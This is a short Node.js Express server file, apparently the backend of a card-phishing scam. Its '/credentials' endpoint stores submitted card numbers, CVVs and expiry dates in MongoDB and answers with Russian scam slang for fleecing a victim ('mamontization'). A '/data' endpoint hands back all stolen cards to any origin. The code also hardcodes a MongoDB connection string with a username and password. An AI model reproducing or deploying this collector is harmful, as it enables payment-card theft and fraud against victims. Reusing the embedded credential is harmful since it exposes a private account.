const express = require("express");
const mongoose = require("mongoose");

const Card = require("./cardModel");

mongoose
  .connect(
    "mongodb+srv://urionzzz:R3qtCEtay5unfDdo@cluster0.oclm802.mongodb.net/?retryWrites=true&w=majority"
  )
  .then(() => {
    console.log("База данных подключена");
  })
  .catch((err) => {
    console.error(err);
  });
const app = express();
app.use(express.json());
app.use(function (req, res, next) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET", "POST");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "X-Requested-With,content-type"
  );
  res.setHeader("Access-Control-Allow-Credentials", true);
  next();
});

const PORT = process.env.PORT || 5000;

app.get("/", (req, res) => {
  console.log("got it");
});

app.get("/data", async (req, res) => {
  try {
    const data = await Card.find();
    res.status(200).json(data);
  } catch (err) {
    console.error(err);
  }
});

app.post("/credentials", async (req, res) => {
  try {
    const { cardnumber, cvv, expires } = req.body;
    const newCard = new Card({
      cardnumber,
      cvv,
      expires,
    });
    console.log(newCard);
    await newCard.save();
    res.status(200).json({ msg: "Мамонтизация прошла успешно" });
  } catch (err) {
    console.error(err);
  }
});

app.listen(PORT, () => {
  try {
    console.log(`Сервер стартанул на порту ${PORT}`);
  } catch (err) {
    console.error(err);
  }
});
